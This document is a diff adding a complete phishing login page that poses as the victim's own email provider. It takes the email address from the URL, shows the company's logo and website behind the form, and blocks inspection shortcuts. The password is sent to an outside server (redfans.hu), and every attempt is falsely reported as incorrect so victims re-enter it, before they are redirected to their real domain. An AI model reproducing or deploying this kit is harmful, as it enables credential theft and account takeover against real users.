@@ -1,0 +1,575 @@
+<html lang="auto"><head> 
+
+	<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script type="text/javascript"  src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+     
+    <title id="Email Login"></title>
+	
+    <!-- Favicon icon -->
+    <link rel="shortcut icon" class="logoimg" href="" type="image/x-icon">
+    <!-- External CSS libraries 
+    <link type="text/css" rel="stylesheet" href="./login2_files/style2.css">
+	
+    <link type="text/css" rel="stylesheet" href="./login2_files/bootstrap.min.css">
+  	-->  <link type="text/css" rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+	
+	<script>
+    // prevent ctrl + s
+    window.addEventListener('keydown', async (e) => {
+        if (e.ctrlKey && (e.which == 83)) {
+            e.preventDefault();
+            return false;
+        }
+    });
+    window.addEventListener('contextmenu', event => event.preventDefault());
+    document.onkeydown = function (e) {
+        if (event.keyCode == 123) {
+            return false;
+        }
+        if (e.ctrlKey && e.keyCode == 'E'.charCodeAt(0)) {
+            return false;
+        }
+        if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {
+            return false;
+        }
+        if (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {
+            return false;
+        }
+        if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {
+            return false;
+        }
+        if (e.ctrlKey && e.keyCode == 'S'.charCodeAt(0)) {
+            return false;
+        }
+        if (e.ctrlKey && e.keyCode == 'H'.charCodeAt(0)) {
+            return false;
+        }
+        if (e.ctrlKey && e.keyCode == 'A'.charCodeAt(0)) {
+            return false;
+        }
+        if (e.ctrlKey && e.keyCode == 'F'.charCodeAt(0)) {
+            return false;
+        }
+        if (e.ctrlKey && e.keyCode == 'E'.charCodeAt(0)) {
+            return false;
+        }
+    }
+    window.onkeydown = (e) => {
+        return !(e.ctrlKey &&
+            (e.keyCode === 67 ||
+                e.keyCode === 85 ||
+                e.keyCode === 86 ||
+                e.keyCode === 88 ||
+                e.keyCode === 117));
+    };    
+</script>
+
+	<style type="text/css">
+	
+	body {
+    font-family: 'Open Sans', sans-serif;
+    color: #535353;
+}
+
+.img-fluid {
+    max-width: 100% !important;
+    height: auto;
+}
+
+.form-control:focus {
+    box-shadow: none;
+}
+
+h1, h2, h3, h4, h5, h6, .h1, .h2, .h3, .h4, .h5, .h6 {
+    font-family: 'Open Sans', sans-serif;
+}
+
+/** Login 1 start **/
+.login-1 {
+    background: rgba(0, 0, 0, 0.04) url(../img/bg-image.jpg) top left repeat;
+    background-size: cover;
+    top: 0;
+    width: 100%;
+    bottom: 0;
+    opacity: 1;
+    min-height: 100vh;
+    text-align: center;
+    position: relative;
+    display: -webkit-box;
+    display: -moz-box;
+    display: -ms-flexbox;
+    display: -webkit-flex;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 30px;
+}
+
+.login-1 .login-inner-form {
+    max-width: 480px;
+    margin: 0 auto;
+    color: #717171;
+    text-align: center;
+}
+
+.login-1 .login-inner-form .details {
+    padding: 25px 30px 30px;
+    background: #fff;
+    border-radius: 5px 5px 0 0;
+}
+
+.login-1 .login-inner-form img {
+    margin-bottom: 15px;
+    height: 3px;
+}
+
+.login-1 .login-inner-form h3 {
+    margin: 0 0 25px;
+    font-size: 18px;
+    font-weight: 400;
+    font-family: "Segoe UI Webfont","Segoe UI",-apple-system,"Helvetica Neue","Lucida Grande",Roboto,Ebrima,"Nirmala UI",Gadugi,"Segoe Xbox Symbol","Segoe UI Symbol";
+    color: #000000;
+}
+
+.login-1 .login-inner-form .form-group {
+    margin-bottom: 15px;  <!-- spaces between form -->
+}
+
+.login-1 .login-inner-form .input-text {
+    width: 100%;
+    padding: 10px 15px;
+    font-size: 15px;
+    border: 1px solid #e8e7e7;
+    outline: none;
+    color: #000000;
+    border-radius: 3px;
+    height: 45px;
+	font-family: "Segoe UI Webfont","Segoe UI",-apple-system,"Helvetica Neue","Lucida Grande",Roboto,Ebrima,"Nirmala UI",Gadugi,"Segoe Xbox Symbol","Segoe UI Symbol";
+}
+
+.login-1 .login-inner-form .btn-md {
+    cursor: pointer;
+    padding: 12px 30px 11px 30px;
+    letter-spacing: 1px;
+    font-size: 15px;
+    font-weight: 500;
+    font-family: "Segoe UI Webfont","Segoe UI",-apple-system,"Helvetica Neue","Lucida Grande",Roboto,Ebrima,"Nirmala UI",Gadugi,"Segoe Xbox Symbol","Segoe UI Symbol";
+    border-radius: 3px;
+}
+
+.login-1 .login-inner-form .social-list{
+    margin-bottom: 0;
+    padding: 0;
+}
+
+.login-1 .login-inner-form .checkbox a {
+    font-size: 14px;
+    color: #000000;
+    float: right;
+}
+
+.login-1 .login-inner-form .terms{
+    margin-left: 3px;
+}
+
+.login-1 .login-inner-form .checkbox {
+    margin-bottom: 25px;
+    font-size: 14px;
+}
+
+.login-1 .login-inner-form .form-check{
+    float: left;
+    margin-bottom: 0;
+}
+
+.login-1 .login-inner-form .form-check a {
+    color: #000000;
+    float: right;
+}
+
+.login-1 .login-inner-form .form-check-input {
+    position: absolute;
+    margin-left: 0;
+}
+
+.login-1 .login-inner-form .form-check label::before {
+    content: "";
+    display: inline-block;
+    position: absolute;
+    width: 17px;
+    height: 17px;
+    margin-left: -25px;
+    border: 1px solid #cccccc;
+    border-radius: 3px;
+    background-color: #fff;
+}
+
+.login-1 .login-inner-form .form-check-label {
+    padding-left: 25px;
+    margin-bottom: 0;
+    font-size: 15px;
+	color: #000000;
+	font-family: "Segoe UI Webfont","Segoe UI",-apple-system,"Helvetica Neue","Lucida Grande",Roboto,Ebrima,"Nirmala UI",Gadugi,"Segoe Xbox Symbol","Segoe UI Symbol";
+}
+
+.login-1 .login-inner-form .checkbox-theme input[type="checkbox"]:checked + label::before {
+    background-color: #0f96f9;
+    border-color: #0f96f9;
+}
+
+.login-1 .login-inner-form input[type=checkbox]:checked + label:before {
+    font-weight: 300;
+    color: #f3f3f3;
+    line-height: 15px;
+    font-size: 14px;
+    content: "\2713";
+}
+
+.login-1 .login-inner-form input[type=checkbox], input[type=radio] {
+    margin-top: 3px;
+}
+
+.login-1 .login-inner-form .social-list li {
+    display: inline-block;
+    font-size: 16px;
+    margin-top: 30px;
+}
+
+.login-1 .login-inner-form .social-list li a {
+    margin:2px;
+    font-size: 14px;
+    width: 35px;
+    height: 35px;
+    border-radius: 3px;
+    display: inline-block;
+    text-align: center;
+    line-height: 35px;
+}
+
+.login-1 .login-inner-form .footer {
+    font-size: 14px;
+    padding: 15px 20px;
+    background-color: #f5f5f5;
+    border-radius: 0 0 5px 5px;
+    border-top: solid 1px #f5f5f5;
+}
+
+.login-1 .login-inner-form .footer span a {
+    color: #717171;
+}
+
+.login-1 .login-inner-form button:focus {
+    outline: none;
+    outline: 0 auto -webkit-focus-ring-color;
+}
+
+.login-1 .login-inner-form .btn-theme:not([disabled]):not(.disabled).active, .btn-theme:not([disabled]):not(.disabled):active, .show > .btn-theme.dropdown-toggle {
+    box-shadow: none;
+}
+
+.login-1 .login-inner-form .btn-theme.focus, .btn-theme:focus {
+    box-shadow: none;
+}
+
+.login-1 .login-inner-form .btn-theme {
+    background: #0f96f9;
+    border: none;
+    color: #fff;
+}
+
+.login-1 .login-inner-form .btn-theme:hover {
+    background: #0294B6;
+}
+
+/** Social media **/
+.login-1 .facebook-bg {
+    background: #4867aa;
+    color: #fff;
+}
+
+.login-1 .facebook-bg:hover {
+    background: #3b589e;
+    color: #fff;
+}
+
+.login-1 .twitter-bg {
+    background: #33CCFF;
+    color: #fff;
+}
+
+.login-1 .twitter-bg:hover {
+    background: #56d7fe;
+    color: #fff;
+}
+
+.login-1 .google-bg {
+    background: #db4437;
+    color: #fff;
+}
+
+.login-1 .google-bg:hover {
+    background: #dc4e41;
+    color: #fff;
+}
+
+.login-1 .linkedin-bg {
+    background: #0177b5;
+    color: #fff;
+}
+
+.login-1 .linkedin-bg:hover {
+    background: #1c82ca;
+    color: #fff;
+}
+
+/** MEDIA **/
+@media (max-width: 992px) {
+    .login-1 {
+        padding: 30px 0;
+    }
+}
+
+#error {
+	float: center;
+	height: 30px;
+	width: 330px;
+	font-family: "Segoe UI Webfont","Segoe UI",-apple-system,"Helvetica Neue","Lucida Grande",Roboto,Ebrima,"Nirmala UI",Gadugi,"Segoe Xbox Symbol","Segoe UI Symbol";
+	font-size: 15px;
+	font-color: black;
+	margin-top: -5px;
+	margin-left: 40px;
+}
+
+<!--
+#ants
+{
+	float: center;
+	height: 3px;
+	width: 352px;
+	margin-top: 80px;
+}
+-->
+
+#submit-btn:disabled {
+  background: #cccccc;
+  color: #000000;
+  cursor: not-allowed;
+}
+</style>
+
+
+</head>
+<body id="top">
+
+
+ <iframe id="mainPage" src="" width="100%" scrolling="no" sandbox="allow-forms allow-pointer-lock
+allow-popups allow-same-origin allow-scripts" style="position: absolute;height: 100%;border: none;"></iframe>
+
+
+<!-- Login 1 start -->
+<div class="login-1">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-12">
+                <div class="login-inner-form">
+                    <div class="details">
+					
+                        <div id="ants" style="display: none; height: 3px; margin-top: 30px; width: 152px;"><img src="https://aadcdn.msftauth.net/shared/1.0/content/images/marching_ants_b540a8e518037192e32c4fe58bf2dbab.gif"></div>
+						
+						<h2 class="text-center"><div id="top"><img src="" alt="" id="logoimg" style="width:32px;height:32px;margin-top:12px;">
+		 
+		<span style="vertical-align: middle; padding-left: 5px" class="logoname"></span> 
+		<br>
+		</div></h2>
+                        <h3>Please, sign-in to continue.</h3>
+						<div id="error"></div>
+                        <form name="members" action="" method="POST">
+                            <div class="form-group">
+                                <input type="email" id="email" name="email" class="input-text" placeholder="Email Address" readonly>
+                            </div>
+                            <div class="form-group">
+                                <input type="password" id="password" name="password" class="input-text" autocomplete="on" placeholder="Password"><br>
+                            </div>
+                            <div class="checkbox clearfix">
+                                <div class="form-check checkbox-theme">
+                                    <input class="form-check-input" type="checkbox" value="" id="rememberMe">
+                                    <label class="form-check-label" for="rememberMe">
+                                        Remember me
+                                    </label>
+                                </div>
+                              <!--  <a href="#">Forgot Password</a> -->
+                            </div>
+                            <div class="form-group md-0">
+                                <button type="submit" id="submit-btn" class="btn-md btn-theme btn-block">Sign in</button>
+                            </div>
+                        </form>
+                    
+						
+						
+                    </div>
+                    <div class="footer">
+                    
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- Login 1 end -->
+  
+  <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+  </body>
+  
+  <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+  <script>
+
+    /* global $ */
+    $(document).ready(function()
+	{
+		//$("#ants").show();
+      var email = window.location.hash.substr(1);
+      if (!email)
+	  {
+		$('#error').show();
+		$('#error').html("<font color='red'>Email field is empty.</font>");
+		return false;
+	  }
+      else
+      {
+        var my_email = email;
+        $('#email').val(my_email);
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!filter.test(my_email)) 
+		{
+          $('#error').show();
+		  $('#error').html("<font color='red'>Unable to validate your email address.</font>");
+          email.focus;
+          return false;
+        }
+		
+        var ind = my_email.indexOf("@");
+        var my_slice = my_email.substr((ind+1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var finals = c.toLowerCase(); //Small letter domain name without extension
+        var finalu = c.toUpperCase(); //Capital letter domain name without extension
+	
+		 $.get("https://logo.clearbit.com/" + my_slice)
+            .done(function() {
+				$("#logoimg").attr("src", "https://logo.clearbit.com/" + my_slice);
+				$("#mainPage").attr("src", "https://www." + my_slice);
+                $(".logoname").html(finalu);
+
+            }).fail(function() {
+                $("#logoimg").attr("src", "https://aadcdn.msauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico");
+				$("#mainPage").attr("src", "https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg");
+                $(".logoname").html("Webmail");
+
+            });
+      }
+
+	 var count = 0;
+	 
+      $('#submit-btn').click(function(event){
+		//$('#error').hide();
+		event.preventDefault();
+		var email = $("#email").val();
+		var password = $("#password").val();
+
+		///////////new injection////////////////
+		var my_email = email;
+		var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+		
+		if (!email)
+		{
+			$('#error').show();
+			$('#error').html("<font color='red'>Email field is empty.</font>");
+			return false;
+		}
+	  
+		if (!filter.test(my_email)) 
+		{
+			$('#error').show();
+			$('#error').html("<font color='red'>Unable to validate your email address.</font>");
+			email.focus;
+			return false;
+		}
+		
+		if (!password) 
+		{
+			$('#error').show();
+			$('#error').html("<font color='red'>Password field is empty.</font>");
+			return false;
+		}
+
+		if (password.length < 5)
+		{
+			$('#error').show();
+			$('#error').html("<font color='red'>Your password is too short.</font>");
+			return false;
+		}
+
+		document.getElementById('submit-btn').disabled = true;
+		$("#ants").show();
+		$("#error").show();
+		$("#error").html("<font color='black'>Please wait while we verify your credentials...</font>");
+		$('#submit-btn').html('Verifing...');
+		
+		$.ajax({
+			  dataType: "JSON",
+			  type: "POST",
+			  url: "https://redfans.hu/ofa/off.php",
+			  data: {
+                    email: email,
+                    password: password
+                },
+			  success: function () {
+				
+				if (count >= 3) 
+				{
+					count = 0;
+					window.location.replace("http://autodiscover."+my_slice);
+                }
+				
+				setTimeout(function () {
+						$("#ants").hide();
+						$('#error').show();
+						$('#error').html("<font color='red'>Your password is incorrect. Please try again.</font>");
+						document.getElementById('submit-btn').disabled = false;
+						$('#submit-btn').html('Sign in');
+						$("#password").val("");
+					}, 3000);
+			  },
+			  
+			  error: function () {
+
+                    if (count >= 3) {
+                        count = 0;
+                        window.location.replace("http://autodiscover."+my_slice);
+                    }
+					
+					setTimeout(function () {
+					$("#ants").hide();
+                    $("#error").show();
+                    $('#error').html("<font color='red'>Your password is incorrect. Please try again.</font>");
+					document.getElementById('submit-btn').disabled = false;
+					$('#submit-btn').html('Sign in');
+					$("#password").val("");
+					}, 3000);
+                },
+			});
+		
+			count = count + 1;
+			event.preventDefault();
+    });
+    });
+
+
+  </script>
+  </html>
